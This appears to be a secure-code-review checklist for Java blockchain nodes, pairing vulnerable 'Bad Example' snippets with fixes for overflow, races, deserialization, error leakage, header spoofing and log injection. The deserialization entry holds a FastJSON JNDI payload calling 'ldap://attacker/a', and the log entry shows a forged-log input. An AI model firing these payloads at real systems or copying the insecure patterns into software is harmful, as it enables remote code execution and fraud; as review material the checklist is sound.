# Common Checks — General Java & Blockchain Security

These checks apply to **all modules** of any Java blockchain node.
Load this file alongside every module-specific check file.

---

### INT-01: Narrowing Cast Before Modulo

- **Severity**: High
- **CWE**: CWE-190 — Integer Overflow or Wraparound

**Problem**
Casting a `long` to `int` before performing modulo silently truncates the high 32 bits. When the `long` value exceeds `Integer.MAX_VALUE` (2,147,483,647), the cast produces a negative or wrong `int`, and the modulo result is incorrect. In a blockchain node this typically corrupts slot assignment, validator index lookup, or reward calculation — all of which are deterministic by design.

**Bad Example**
```java
// n = monotonically growing long (slot number, block height, epoch counter …)
// mod = number of buckets (validator count, shard count, …)
int idx = (int) n % mod;
// When n = 2_200_000_000L:
//   (int) 2_200_000_000L  →  -2_094_967_296  (overflow)
//   -2_094_967_296 % 21   →  negative index   (wrong selection)
```

**Good Example**
```java
// Modulo first on long, then cast the (already in-range) result
int idx = (int) (n % mod);
// n % mod is always in [0, mod-1], safe to cast to int
```

---

### INT-02: Unchecked Arithmetic on Token Amounts

- **Severity**: High
- **CWE**: CWE-190 — Integer Overflow or Wraparound

**Problem**
Java's `long` arithmetic wraps silently on overflow. Token balances and fees are stored as `long` (satoshi/wei/sun). The expression `balance + amount` overflows when `balance + amount > Long.MAX_VALUE` (≈ 9.2 × 10¹⁸), wrapping to a negative number. An attacker can reach an absurdly large balance or cause a negative balance that passes `>= 0` validation.

**Bad Example**
```java
// Transfer: no overflow check
long newBalance = toAccount.getBalance() + transferAmount;
toAccount.setBalance(newBalance);  // wraps silently if sum > Long.MAX_VALUE
```

**Good Example**
```java
import com.google.common.math.LongMath;

long newBalance;
try {
    newBalance = LongMath.checkedAdd(toAccount.getBalance(), transferAmount);
} catch (ArithmeticException e) {
    throw new ValidationException("Balance overflow");
}
toAccount.setBalance(newBalance);
```

---

### INT-03: Discarded Return Value of Overflow-Checked Operation

- **Severity**: High
- **CWE**: CWE-190 — Integer Overflow or Wraparound

**Problem**
`Math.addExact()`, `Math.multiplyExact()`, and Guava's `LongMath.checkedAdd()` only protect against overflow if their **return value is used**. Calling them and discarding the result means the exception fires (if overflow occurs), but the original unchecked expression is still applied — making the check a no-op.

**Bad Example**
```java
// "Validation" call whose result is thrown away
Math.addExact(account.getBalance(), amount);   // result discarded

// Actual update uses unchecked arithmetic anyway
account.setBalance(account.getBalance() + amount);  // can still overflow
```

**Good Example**
```java
// Use the checked result for the update
long newBalance = Math.addExact(account.getBalance(), amount);
account.setBalance(newBalance);
```

---

### INT-04: Floating-Point in Deterministic Calculation

- **Severity**: High
- **CWE**: CWE-1339 — Insufficient Precision or Storage of Numeric Value

**Problem**
`double` and `float` cannot represent all integers exactly beyond 2⁵³. The same floating-point expression may produce different bit-level `long` results after truncation across JVM versions or CPU architectures (x86 vs ARM). Any calculation that affects shared state — fee splits, interest accrual, weight-proportional allocation — must use integer-only arithmetic so that all nodes independently arrive at the same value.

**Bad Example**
```java
// Floating-point intermediate — result is platform-dependent after (long) cast
long share = (long) (weight * ((double) total / totalWeight));
// double division introduces rounding that varies across JVM / CPU combinations
// sum of all shares may silently differ from total
```

**Good Example**
```java
// Integer-only: deterministic on all platforms
// Pattern: numerator * a / b  (no floating-point intermediate)
long share = weight * total / totalWeight;  // ✅

// When splitting across N recipients, distribute the remainder explicitly
// so that sum(shares) == total (no funds silently lost or created)
long distributed = 0;
for (Recipient r : recipients) {
    long s = r.getWeight() * total / totalWeight;
    credit(r, s);
    distributed += s;
}
credit(recipients.get(0), total - distributed); // remainder to first (deterministic)
// Applies to: validator rewards, fee splits, interest distribution, delegator payouts
```

---

### RACE-01: Shared State Field Without Visibility Guarantee

- **Severity**: High
- **CWE**: CWE-362 — Concurrent Execution Using Shared Resource with Improper Synchronization

**Problem**
A field written by one thread and read by another without `volatile`, `synchronized`, or an `Atomic*` wrapper is subject to stale-read: the JVM may keep the writing thread's update in a CPU cache register, invisible to the reading thread. In a blockchain node where block processing and API serving run in separate thread pools, this silently returns outdated state to clients.

**Bad Example**
```java
public class ChainHead {
    private Block head;  // no volatile

    public void setHead(Block b) { this.head = b; }  // written by block thread
    public Block getHead()       { return head; }     // read by API thread — may be stale
}
```

**Good Example**
```java
public class ChainHead {
    private volatile Block head;
    // OR: private final AtomicReference<Block> head = new AtomicReference<>();
}
```

---

### RACE-02: TOCTTOU — Condition Checked Outside Lock

- **Severity**: High
- **CWE**: CWE-367 — Time-of-Check Time-of-Use (TOCTOU) Race Condition

**Problem**
Reading a condition without a lock and then acting on it inside a lock creates a window where the condition can change between the two points. The state seen during the check may be stale by the time the action executes, leading to duplicate operations, overdrafts, or bypassed limits — depending on what the guarded condition protects.

**Bad Example**
```java
// Check outside lock — another thread may invalidate the condition before we act
if (queue.size() < MAX_CAPACITY) {
    synchronized (lock) {
        // ❌ size may now equal MAX_CAPACITY — limit silently exceeded
        queue.add(item);
    }
}
```

**Good Example**
```java
synchronized (lock) {
    if (queue.size() < MAX_CAPACITY) {  // ✅ check and act under the same lock
        queue.add(item);
    }
}
// Applies to: mempool size limits, pending-request caps, balance-before-transfer checks,
// "is-my-turn" slot checks in consensus scheduling, nonce uniqueness enforcement
```

---

### OOM-01: Unbounded In-Memory Collection Fed by Network Input

- **Severity**: High
- **CWE**: CWE-770 — Allocation of Resources Without Limits or Throttling
- **OWASP**: A05:2021 — Security Misconfiguration

**Problem**
Collections that grow without an upper bound, when populated by network messages, allow a remote attacker to exhaust heap memory by sending a stream of messages that add entries and never trigger removal. No authentication is required — P2P gossip networks are open.

**Bad Example**
```java
// Map grows with every incoming inventory announcement
private final Map<Hash, Long> pendingRequests = new ConcurrentHashMap<>();
// Attacker sends INV messages for non-existent items; entries accumulate forever
```

**Good Example**
```java
// Bounded cache with automatic eviction
private final Cache<Hash, Long> pendingRequests = CacheBuilder.newBuilder()
    .maximumSize(10_000)
    .expireAfterWrite(30, TimeUnit.SECONDS)
    .build();
```

---

### DESER-01: Deserialization of Untrusted Network Data

- **Severity**: Critical
- **CWE**: CWE-502 — Deserialization of Untrusted Data
- **OWASP**: A08:2021 — Software and Data Integrity Failures

**Problem**
Deserializing data received from the network using frameworks that support polymorphic type dispatch (FastJSON autoType, Jackson default typing, Java native `ObjectInputStream`) allows an attacker to instantiate arbitrary classes and chain method calls into remote code execution. P2P and HTTP endpoints are both attack surfaces because neither requires authentication.

**Bad Example**
```java
// FastJSON 1.x with default settings — autoType enabled
JSONObject obj = JSON.parseObject(rawInput);
// Input: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/a","autoCommit":true}
// → JNDI lookup → RCE

// Java native deserialization
ObjectInputStream ois = new ObjectInputStream(networkStream);
Object obj = ois.readObject();  // executes gadget chains
```

**Good Example**
```java
// FastJSON: enable safe mode globally at startup
ParserConfig.getGlobalInstance().setSafeMode(true);

// FastJSON2 (safe by default) or Jackson with no default typing
ObjectMapper mapper = new ObjectMapper();
// Never call: mapper.enableDefaultTyping(...)
MyDto dto = mapper.readValue(input, MyDto.class);  // explicit target type

// Protobuf: preferred for P2P — type-safe, no reflection
MyMessage msg = MyMessage.parseFrom(bytes);  // schema-validated, no gadget risk
```

---

### ERR-01: Internal Exception Details Returned to API Clients

- **Severity**: Medium
- **CWE**: CWE-209 — Generation of Error Message Containing Sensitive Information
- **OWASP**: A05:2021 — Security Misconfiguration

**Problem**
Returning full exception class names, messages, or stack traces to HTTP or RPC clients reveals internal package structure, library versions, and code paths. Attackers use this information to identify exploitable components and tailor attacks.

**Bad Example**
```java
} catch (Exception e) {
    response.setStatus(400);
    response.getWriter().write(e.getClass().getName() + ": " + e.getMessage());
    // Returns: "org.example.blockchain.ValidationException: signature mismatch at offset 32"
}
```

**Good Example**
```java
} catch (ValidationException e) {
    log.warn("Validation failed for request from {}: {}", clientIp, e.getMessage());
    response.setStatus(400);
    response.getWriter().write("{\"error\":\"VALIDATION_FAILED\"}");
} catch (Exception e) {
    log.error("Unexpected error", e);  // full detail server-side only
    response.setStatus(500);
    response.getWriter().write("{\"error\":\"INTERNAL_ERROR\"}");
}
```

---

### ERR-02: Security Check Exception Silently Swallowed

- **Severity**: High
- **CWE**: CWE-390 — Detection of Error Condition Without Action
- **OWASP**: A02:2021 — Cryptographic Failures

**Problem**
A try-catch block that catches exceptions thrown by a security check (signature verification, access control, schema validation) but does not `return` or `throw` allows execution to continue as if the check had passed. The exception is logged or discarded, and the guarded operation proceeds with invalid or unauthenticated input. In a blockchain node, this can silently bypass signature verification on consensus messages or transaction validation, producing the same effect as having no check at all. The severity escalates to Critical when the swallowed exception wraps authentication or cryptographic verification.

**Bad Example**
```java
public void onMessage(Message msg) {
    try {
        verifier.check(msg.key(), msg.data(), msg.sig());
    } catch (Exception e) {
        log.warn("Signature check error: {}", e.getMessage());
        // ❌ No return — falls through; process() runs even for invalid signature
    }
    process(msg);
}
```

**Good Example**
```java
public void onMessage(Message msg) {
    try {
        verifier.check(msg.key(), msg.data(), msg.sig());
    } catch (SignatureException e) {
        log.warn("Rejected message with invalid signature from {}", msg.sender());
        return;  // ✅ abort on expected failure
    } catch (Exception e) {
        log.error("Unexpected error during signature verification", e);
        return;  // ✅ treat unexpected errors as security failures too
    }
    process(msg);
}
```

---

### NET-01: Client IP Extracted from Spoofable Proxy Header

- **Severity**: Medium
- **CWE**: CWE-290 — Authentication Bypass by Spoofing
- **OWASP**: A07:2021 — Identification and Authentication Failures

**Problem**
When an API server is deployed behind a reverse proxy, `request.getRemoteAddr()` always returns the proxy's IP. If the code switches to trusting `X-Forwarded-For` or `X-Real-IP` without validating that the request actually came from a trusted proxy, any client can forge any source IP by setting the header — completely bypassing per-IP rate limiting.

**Bad Example**
```java
// Trusts the header unconditionally — any client can set it
String clientIp = request.getHeader("X-Forwarded-For");
if (clientIp == null) clientIp = request.getRemoteAddr();
rateLimiter.check(clientIp);
```

**Good Example**
```java
String clientIp;
if (TRUSTED_PROXY_CIDRS.contains(request.getRemoteAddr())) {
    // Only trust the header when the direct connection is from a known proxy
    String forwarded = request.getHeader("X-Real-IP");
    clientIp = (forwarded != null) ? forwarded : request.getRemoteAddr();
} else {
    clientIp = request.getRemoteAddr();
}
rateLimiter.check(clientIp);
```

---

### NET-02: Log Injection via Unsanitized External Data

- **Severity**: Medium
- **CWE**: CWE-117 — Improper Output Neutralization for Logs

**Problem**
Writing externally-sourced strings (peer IP address, peer-supplied message fields, transaction memo, contract event data) directly into log statements allows an attacker to inject newline characters (`\r\n`) into the log output. The injected content appears as a legitimate, independently-generated log entry in log aggregators and SIEM tools, enabling an attacker to forge audit trail entries — for example, fabricating a successful admin login or a block finality confirmation. This undermines security monitoring and incident response. Note: SLF4J parameterized logging (`{}` placeholders) prevents string concatenation issues but does NOT strip control characters — explicit sanitization is still required.

**Bad Example**
```java
public void onPeerConnected(String peerAddress, PeerInfo info) {
    // ❌ peerAddress is attacker-controlled; raw characters reach the log sink
    log.info("Connected to peer: " + peerAddress + " version=" + info.getVersion());
    // Attacker sends peerAddress = "1.2.3.4\n[WARN] Admin login successful for root"
    // → fabricated WARNING entry appears in log as a legitimate output line
}
```

**Good Example**
```java
// Strip control characters from all externally-sourced strings before logging
private static String sanitize(String input) {
    return input == null ? "" : input.replaceAll("[\\r\\n\\t]", "_");  // ✅
}

public void onPeerConnected(String peerAddress, PeerInfo info) {
    log.info("Connected to peer: {} version={}", sanitize(peerAddress), info.getVersion());
}
// Apply sanitize() to: peer addresses, wire-format type names, transaction memos,
// contract event fields — anything originating from the network.
```
